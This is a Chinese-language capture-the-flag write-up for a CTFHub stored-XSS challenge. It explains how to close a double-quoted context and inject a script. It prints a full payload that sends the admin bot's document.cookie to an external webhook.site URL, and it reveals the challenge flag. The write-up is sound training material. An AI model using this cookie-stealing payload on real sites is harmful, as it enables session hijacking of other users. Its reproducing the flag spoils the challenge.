---
title: CTFHub XSS 存储型
date: 2026-10-08
categories: CTFHub
tags: CTFHub, Web, XSS
---

# 题目：CTFHub XSS 存储型

## 题目描述
存储型XSS，输入名称，管理员Bot会访问页面，需要获取Bot的Cookie拿到flag。

## 解题思路
页面输出格式：`Hello, "用户输入内容"`
用户输入被包裹在双引号内，需要先闭合双引号，跳出字符串上下文，注入`<script>`标签。
当Bot访问页面时，JS自动执行，将Bot的Cookie发送到webhook站点，读取Cookie获取flag。

## 解题步骤
1. 打开www.webhook.site网站，查看url
2. 将payload输入进name后，点击submit
   完整Payload：
   ```html
   "><script>new Image().src="https://webhook.site/53595844-8e14-4c3f-89b4-bffe6625e4e2?c="+document.cookie;</script>
3. 复制地址粘贴到url，点击send
4. 返回webhook页面，查看最新GET，得到flag=ctfhub{9077d4ef95e0312f033f6925}

## 踩坑指南
1. 只看页面可视化文字，不看HTML源码。判断注入是否成功，优先看渲染后的HTML结构。
2. 引号嵌套冲突。payload内部引号和外层引号冲突，会导致注入失效。
3. 提交payload后立刻刷新webhook，Bot访问存在延迟，需要等待60~90秒。
4. 关键点：存储型XSS会把payload存入后端，不需要人工点击，Bot打开页面自动执行JS。
 
## 知识点总结
1. 存储型XSS(Persistent XSS)：恶意代码存入数据库，所有访问页面的用户都会触发，危害比反射型XSS更大。
2. 引号闭合注入：输出在引号包裹的环境中，需要提前闭合引号，脱离原有字符串，注入HTML标签。
3. 利用Bot机制：靶场管理员Bot会访问链接，模拟管理员视角，用来窃取管理员Cookie。
4. 利用Image对象发送请求： new Image().src  可以发起GET请求，将Cookie带出到外部webhook平台。
